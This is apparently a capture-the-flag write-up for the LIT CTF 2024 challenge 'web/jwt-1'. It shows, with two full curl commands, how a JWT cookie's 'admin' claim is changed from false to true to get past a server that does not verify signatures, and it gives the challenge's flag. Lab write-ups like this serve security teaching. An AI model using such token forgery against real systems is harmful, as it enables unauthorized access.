# LIT CTF 2024: web/jwt-1
**Title:** web/jwt-1

**Description:** I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at [http://litctf.org:31781/](http://litctf.org:31781/).
## Solution:
The description hints at the use of cookies for authentication. Here’s how you can solve it:

### Step 1: Obtain the Cookie:
Visit the site, sign up, log in, and try clicking the "GET FLAG" button. You’ll receive an `Unauthorized` response.

### Step 2: Analyze the Request:
Use your browser’s Developer Tools to inspect the request sent to [http://litctf.org:31781/flag](http://litctf.org:31781/flag). Here’s a sample `curl` command for reference:

```bash
curl "http://litctf.org:31781/flag" ^
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" ^
  -H "Accept-Language: en-US,en;q=0.9,en-IN;q=0.8" ^
  -H "Cache-Control: max-age=0" ^
  -H "Connection: keep-alive" ^
  -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoic2hvaWlobzIiLCJhZG1pbiI6ZmFsc2V9.VPpGN6m^%^2BrNwhg^%^2BDSZ^%^2BGYDYV24eDA1ygIvW^%^2Fu50x^%^2FcSY^" ^
  -H "Referer: http://litctf.org:31781/" ^
  -H "Upgrade-Insecure-Requests: 1" ^
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0" ^
  --insecure
```

### Step 3: Modify the JWT Token:
Use an online tool like [jwt.io](https://jwt.io/) to decode and modify the JWT token. Change the `admin` field from `false` to `true`. 

By tampering with the JWT, you can gain the necessary authorization to access the flag. 

### Step 4: Send the request with tampered JWT:
For this I used an online tool [Run Curl Commands Online (reqbin.com)](https://reqbin.com/curl) and sent the request:
```bash
curl "http://litctf.org:31781/flag" ^
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" ^
  -H "Accept-Language: en-US,en;q=0.9,en-IN;q=0.8" ^
  -H "Cache-Control: max-age=0" ^
  -H "Connection: keep-alive" ^
  -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoic2hvaWlobzIiLCJhZG1pbiI6dHJ1ZX0.REbM2gVSy32YPjfXU-VeWGG4xTfdAn3RkFRiRtJHV3E" ^
  -H "Referer: http://litctf.org:31781/" ^
  -H "Upgrade-Insecure-Requests: 1" ^
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0" ^
  --insecure
```

And the response we got is our flag: `LITCTF{o0ps_forg0r_To_v3rify_1re4DV9}`
